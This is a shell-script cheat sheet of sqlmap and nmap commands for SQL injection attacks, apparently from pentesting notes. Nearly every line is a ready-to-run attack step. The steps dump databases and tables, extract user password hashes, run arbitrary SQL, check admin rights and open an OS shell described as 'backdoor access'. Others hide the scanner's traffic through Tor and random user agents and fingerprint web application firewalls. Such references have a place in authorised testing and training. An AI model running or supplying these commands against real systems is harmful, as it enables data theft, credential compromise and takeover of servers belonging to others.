#!/bin/sh


##-=============================-##
##   [+] Targeted sqlmap scan
##-=============================-##
sqlmap -u "$Domain/meh.php?id=1" --dbms=mysql --tech=U --random-agent --dump


##-=======================================================================-##
##   [+] Scan url for union + error based injection with mysql backend 
##   [+] use a random user agent + database dump 
##-=======================================================================-##
sqlmap -o -u http://$ip/index.php --forms --dbs
sqlmap -o -u "http://$ip/form/" --forms


##-========================================-##
##   [+] Sqlmap check form for injection  
##-========================================-##
sqlmap -o -u "http://$ip/vuln-form" --forms -D database-name -T users --dump


##-=============================-##
##   [+] Enumerate databases  
##-=============================-##
sqlmap --dbms=mysql -u "$URL" --dbs


##-==================================================-##
##   [+] Enumerate tables from a specific database  
##-==================================================-##
sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --tables


##-===========================================================-##
##   [+] Dump table data from a specific database and table  
##-===========================================================-##
sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" -T "$TABLE" --dump


##-=====================================-##
##   [+] Specify parameter to exploit     
##-=====================================-##
sqlmap --dbms=mysql -u "$Domain/param1=value1&param2=value2" --dbs -p param2


##-======================================================================-##
##   [+] Specify parameter to exploit in 'nice' URIs (exploits param1)
##-======================================================================-##
 sqlmap --dbms=mysql -u "$Domain/param1/value1*/param2/value2" --dbs


##-=====================-##
##   [+] Get OS shell  
##-=====================-##
sqlmap --dbms=mysql -u "$URL" --os-shell


##-=====================-##
##   [+] Get SQL shell  
##-=====================-##
sqlmap --dbms=mysql -u "$URL" --sql-shell


##-==================-##
##   [+] SQL query  
##-==================-##
sqlmap --dbms=mysql -u "$URL" -D "$DATABASE" --sql-query "SELECT * FROM $TABLE;"


##-==============================-##
##   [+] Use Tor Socks5 proxy
##-==============================-##
sqlmap --tor --tor-type=SOCKS5 --check-tor --dbms=mysql -u "$URL" --dbs


##-==============================-##
##   [+] Automated sqlmap scan
##-==============================-##
sqlmap -u $URL --forms --batch --crawl=2 --cookie= --level=5 --risk=3


##-=============================================-##
##   [+] Test URL and POST data
##-=============================================-##
## --------------------------------------------- ##
##   [?] Return database banner (if possible)
## --------------------------------------------- ##
sqlmap --url="$URL" --data="<post-data>" --banner


##-====================================-##
##   [+] Parse request data and test
##-====================================-##
## -------------------------------------------------------------------- ##
##   [?] request data can be obtained with burp
## -------------------------------------------------------------------- ##
sqlmap -u $RequestFile <options>


##-=========================-##
##   [+] Use random agent 
##-=========================-##
sqlmap -u $RequestFile --random-agent


##-================================-##
##   [+] Fingerprint SQL server
##-================================-##
sqlmap -u $RequestFile --fingerprint


##-=====================-##
##   [+] Identify WAF
##-=====================-##
sqlmap -u $RequestFile --check-waf/--identify


##-===================================================-##
##   [+] Get database username, name, and hostname
##-===================================================-##
sqlmap -u $RequestFile --current-user --current-db --hostname


##-==========================================-##
##   [+] Check if user is a database admin
##-==========================================-##
sqlmap -u $RequestFile --is-dba


##-================================================-##
##   [+] Get database users and password hashes
##-================================================-##
sqlmap -u $RequestFile --users --passwords

##-============================-##
##   [+] Enumerate databases
##-============================-##
sqlmap -u $RequestFile --dbs

##-=====================================-##
##   [+] List tables for one database
##-=====================================-##
sqlmap -u $RequestFile -D <db-name> --tables

##-================================-##
##   [+] Other database commands
##-================================-##
sqlmap -u $RequestFile -D <db-name> --columns --schema --count

##-==========================-##
##   [+] Enumeration flags
##-==========================-##
sqlmap -u $RequestFile -D <db-name> -T <tbl-name> -C <col-name> -U <user-name>

##-=====================-##
##   [+] Extract data
##-=====================-##
sqlmap -u $RequestFile -D <db-name> -T <tbl-name> -C <col-name> --dump

##-===========================-##
##   [+] Execute SQL Query
##-===========================-##
sqlmap -u $RequestFile --sql-query="<sql-query>"

##-==================================-##
##   [+] Append/Prepend SQL Queries
##-==================================-##
sqlmap -u $RequestFile --prefix="<sql-query>" --suffix="<sql-query>"

##-===========================================-##
##   [+] Get backdoor access to sql server
##-===========================================-##
## ------------------------------------------- ##
##   [?] can give shell access

sqlmap -u $RequestFile --os-shell


##-================================================================-##
##   [+] sqlmap post-request
##-================================================================-##
## ---------------------------------------------------------------- ##
##   [?] captured request via Burp Proxy via Save Item to File.
## ---------------------------------------------------------------- ##
sqlmap -r post-request -p item --level=5 --risk=3 --dbms=mysql --os-shell --threads 10












##-================================================================-##
##   [+] 
##-================================================================-##
nmap -sU --script=ms-sql-info $TARGET


